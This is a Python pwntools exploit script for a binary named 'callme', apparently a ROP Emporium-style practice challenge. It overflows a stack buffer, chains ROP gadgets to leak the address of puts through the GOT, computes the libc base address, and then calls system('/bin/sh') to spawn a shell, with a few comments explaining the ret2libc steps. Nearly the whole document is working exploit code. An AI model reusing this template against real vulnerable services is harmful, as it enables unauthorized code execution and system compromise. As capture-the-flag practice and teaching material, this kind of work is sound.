#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./callme')
context.bits = 64

libc = elf.libc
rop = ROP(elf)

gs = '''
set disable-randomization off
b pwnme
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

puts_plt = elf.plt['puts']          # so that we can call the puts function
main = elf.sym['main']              # so that we can call main again, after leaking an address
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0] # additional ret instruction for padding, to realign stack

# overflow stack, print out function's address, restart at main

def find_addr(func):
    payload = b'A'*32 # char buffer
    payload += b'B'*8 # ebp
    func_got = elf.got[func]
    # overflow stack, print out function's address, restart at main
    payload += p64(pop_rdi)
    payload += p64(func_got)
    print(hex(func_got))
    payload += p64(puts_plt)
    print(hex(puts_plt))
    payload += p64(main)
    #print(payload)

    r.sendlineafter('>', payload)
    
    leaked_string = r.recvuntil("\ncallme")
    received = leaked_string.replace(b"Thank you!\n", b"")
    received = received.replace(b"\ncallme", b"")
    leaked_addr = u64(received.ljust(8, b"\x00"))

    print("--- leak BEGIN ---")
    print(hex(leaked_addr))
    print("--- leak END ---")

    if libc.address == 0:
        libc.address = leaked_addr - libc.symbols[func]
        print("libc base @ %s" % hex(libc.address))
    else:
        print(hex(libc.address))

find_addr('puts')
#find_addr('__libc_start_main')

bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

payload = b'A'*32 # char buffer
payload += b'B'*8 # ebp
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)
print(payload)

print(r.clean())

# Using puts or printf, we can print out the address of a known libc function.
# Then use that to calculate the base address at which libc is loaded.

r.sendlineafter('>', payload)
print(r.clean())


#============= interactive ================

r.interactive()
